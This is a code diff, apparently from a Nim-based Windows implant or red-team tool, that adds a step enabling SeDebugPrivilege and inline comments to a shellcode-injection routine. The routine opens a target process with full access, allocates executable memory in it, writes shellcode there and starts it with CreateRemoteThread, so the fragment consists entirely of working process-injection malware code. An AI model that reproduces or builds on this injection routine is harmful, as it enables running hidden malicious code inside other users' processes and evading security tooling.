@@ -1,4 +1,5 @@
 import helpers
+import priv
 import winim
 import dynlib
 import strutils
@@ -80,6 +81,11 @@ proc patch_func*(command_name: string): bool =
 
 proc inject_shellcode*(shellc: seq[byte], pid: int): bool = 
 
+    # set debug privileges
+    if not set_privilege("SeDebugPrivilege"):
+        return false
+    
+    # open remote process
     let process_h = OpenProcess(
     PROCESS_ALL_ACCESS, 
     false, 
@@ -87,7 +93,8 @@ proc inject_shellcode*(shellc: seq[byte], pid: int): bool =
     )
     if process_h == 0:
         return false
-
+    
+    # allocate memory in remotre process
     let remote_address = VirtualAllocEx(
         process_h,
         NULL,
@@ -96,6 +103,7 @@ proc inject_shellcode*(shellc: seq[byte], pid: int): bool =
         PAGE_EXECUTE_READ_WRITE
     )
 
+    # write shellcode to remote process
     let write_success = WriteProcessMemory(
         process_h, 
         remote_address,
@@ -107,6 +115,7 @@ proc inject_shellcode*(shellc: seq[byte], pid: int): bool =
         CloseHandle(process_h)
         return false
 
+    # start the remote shellcode as a thread
     let thread_handle = CreateRemoteThread(
         process_h, 
         NULL,
